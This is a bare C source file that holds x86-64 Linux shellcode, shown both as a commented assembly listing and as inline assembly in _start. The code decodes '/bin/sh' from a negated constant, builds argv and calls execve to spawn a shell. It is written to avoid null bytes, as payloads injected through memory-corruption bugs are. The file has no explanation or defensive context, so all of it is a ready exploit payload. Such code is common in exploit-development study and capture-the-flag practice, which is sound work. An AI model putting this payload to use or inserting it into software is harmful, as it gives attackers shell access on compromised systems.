/*
xor eax, eax
mov rbx, 0xFF978CD091969DD1
neg rbx
push rbx
push rsp
pop rdi
cdq
push rdx
push rdi
push rsp
pop rsi
mov al, 0x3b
syscall
 */

void _start(){
    __asm__ __volatile__("xor %eax,%eax");
    __asm__ __volatile__("movq $0xFF978CD091969DD1,%rbx");
    __asm__ __volatile__("neg %rbx");
    __asm__ __volatile__("pushq %rbx");
    __asm__ __volatile__("pushq %rsp");
    __asm__ __volatile__("popq %rdi");
    __asm__ __volatile__("cdq");
    __asm__ __volatile__("pushq %rdx");
    __asm__ __volatile__("pushq %rdi");
    __asm__ __volatile__("pushq %rsp");
    __asm__ __volatile__("popq %rsi");
    __asm__ __volatile__("movb $0x3b,%al");
    __asm__ __volatile__("syscall");
}

